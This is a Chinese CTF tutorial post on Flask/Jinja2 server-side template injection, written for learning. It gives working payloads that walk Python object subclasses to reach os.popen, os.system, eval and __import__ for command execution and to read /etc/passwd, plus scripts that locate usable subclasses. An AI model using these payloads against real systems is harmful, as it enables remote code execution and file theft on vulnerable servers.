###  前言

从极客大挑战中一道题，虽然挺简单的，但是自己发现在模板注入中有很多不懂的东西。

###  flask基础

先理解flask的流程明白

```python
from flask import flask 
@app.route('/index/')
def hello_word():
    return 'hello word'
```

其中@app.route('/index/'),是将函数跟url绑定起来，当你访问http://xxx/index,flask就会返回helloworld。



flask的渲染方法有render_template和render_template_string两种。

render_template()是用来渲染一个指定的文件的。使用如下

```
return render_template('index.html')
```

render_template_string则是用来渲染一个字符串的。SSTI与这个方法密不可分。

使用方法如下

```
html = '<h1>helloworld</h1>'
return render_template_string(html)
```



flask是使用jinjia2来作为渲染引擎的，而{{}}在jinjia中作为变量包裹标识符，flask会将{{}}中的内容当作变量来解析

我们就根据{{}}，来引入了flask的SSTI

###  SSTI

####  简介

SSTI就叫做模板注入，其原理，就是用户控制输入，当输入一定的内容后，数据就可能变成程序的一部分，导致执行一些意外的程序。

在SSTI中，{{}}为变量包裹标识符，比如{{1*2}}，就会输出2

运用流程：

先找到父类`<type 'object'>`-->寻找子类-->找关于命令执行或者文件操作的模块。

####  魔术方法

```
__class__  返回类型所属的对象
__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__base__   返回该对象所继承的基类
// __base__和__mro__都是用来寻找基类的

__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
__init__  类的初始化方法
__globals__  对包含函数全局变量的字典的引用
```

1.获取字符串的类对象

```
输入：''.__class__
输出：<type 'str'>
```

2 、寻找基类

```
输入： ''.__class__.__mro__
输出：(<type 'str'>, <type 'object'>
其中输入：__mro__可以换成__bases__
```

3.寻找子类

```
输入：''.__class__.__mro[1]__.__subclasses__()
subclasses加括号，返回子类，不加括号，返回地址
输出：<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>  .......
```

这儿我们用python来找到可用的子类

```python
a = """子类"""
num = 0
allList = []
result = ""
for i in a:
    if i == ">":
        result += i
        allList.append(result)
        result = ""
    elif i == "\n" or i == ",":
        continue
    else:
        result += i
# enumerate正对于列表和元组，有序号，需要将上面的字符串全部转换为列表才能遍历。
for k, v in enumerate(allList):
    if "os._wrap_close" in v: #找可用的引用类和序号
        print(str(k) + "--->" + v)
```

我们找序号132的os._wrap_close

我们就可以利用这个子类，使用命令执行

```
{{''.__class__.__mro__[2].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}
popen后面的为命令执行语句，popen为全局变量的一个
```

这儿还有个找os模块的脚本(但是这个感觉不是太好用)

```python
for item in ''.__class__.__mro__[2].__subclasses__():
    try:
         if 'os' in item.__init__.__globals__:
             print num,item
         num+=1
    except:
        print '-'
        num+=1
```

####  命令执行

```
利用eval()函数导入os库执行命令
利用本身已经导入os库的类执行命令
利用warnings.catch_warnings执行命令
利用commands执行命令
```

利用eval函数执行命令

python找eval函数的类

```python
count = -1
for i in ''.__class__.__mro__[-1].__subclasses__():
	count += 1
	if "warpper" in repr(i.__init__):
		pass
	else:
		try:
			if "eval" in repr(i.__init__.__globals__['__builtins__']):
				print(count, i)
		except:
			pass
```

payload

```
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')}}
```

利用本身导入os库的类执行命令

寻找含有os库的类

```python
count = -1
for i in ''.__class__.__mro__[-1].__subclasses__():
	count += 1
	if "warpper" in repr(i.__init__):
		pass
	else:
		try:
			if "os" in repr(i.__init__.__globals__):
				print(count, i)
		except:
			pass
```

payload

```
无回显：''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
由回显：''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('whoami').read()
```

新的payload

```
[].__class__.__base__.__subclasses__()[189].__init__.__globals__['__builtins__']['__imp'+'ort__']('os').__dict__['pop'+'en']('ls').read()
```



利用warnings.catch_warnings执行命令

查看warnings.catch_warnings方法的位置

```
>>>[].__class__.__base__.__subclasses__().index(warnings.catch_warnings)
59
```

查看linecatch的位置

```
>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index('linecache')
25
```

查找os模块的位置

```
>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys().index('os')
12
```

查找system方法的位置(在这里使用`os.open().read()`可以实现一样的效果,步骤一样,)

```
>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys().index('system')
137
>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys().index('popen')
109
```

调用system方法

```
>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[137]('whoami')
root
0
>>> [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[109]('whoami').read()
```

利用commands实现命令执行

```
{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('commands').getstatusoutput('whoami')
```

#### 文件读取

在子类中如果找到了file，我们可以读取文件

```
{{''.__class__.__mro__[0].__subclasses__[40]('/etc/passwd').read(),直接读取/etc/passwd的文件}}
```

不仅有file读取文件，我们还可以使用builtin来读取文件

```
__builtin__.open()
__builtin__.int()
__builtin__.chr()
```

```
#__init__初始化属性后
#在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的
count = -1
for i in ().__class__.__mro__[-1].__subclasses__():
	count += 1
	if "warpper" in repr(i.__init__):
		pass
	else:
		print count, i
#__globals__全局方法，查找当前类包含的所有方法和变量及参数
count = -1
for i in ().__class__.__mro__[-1].__subclasses__():
	count += 1
	if "warpper" in repr(i.__init__):
		pass
	else:
		try:
			if "file" in repr(i.__init__.__globals__):#file可以换
				print count, i
		except:
			pass
```

找到子类后，builtin是全局变量的一种，我们直接运用开始文件读取

```
{{''.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()}}

当file换成open后，利用open读取
{{''.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
```

###  过滤bypass

[羽师傅](https://blog.csdn.net/miuzzx/article/details/110220425)

https://www.freebuf.com/articles/web/264088.html

[y4师傅](https://blog.csdn.net/solitudi/article/details/107752717?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163503859016780262524331%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163503859016780262524331&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-107752717.pc_v2_rank_blog_default&utm_term=ssti&spm=1018.2226.3001.4450)

###  参考文献

```
https://www.freebuf.com/articles/network/187845.html
https://xz.aliyun.com/t/3679
```

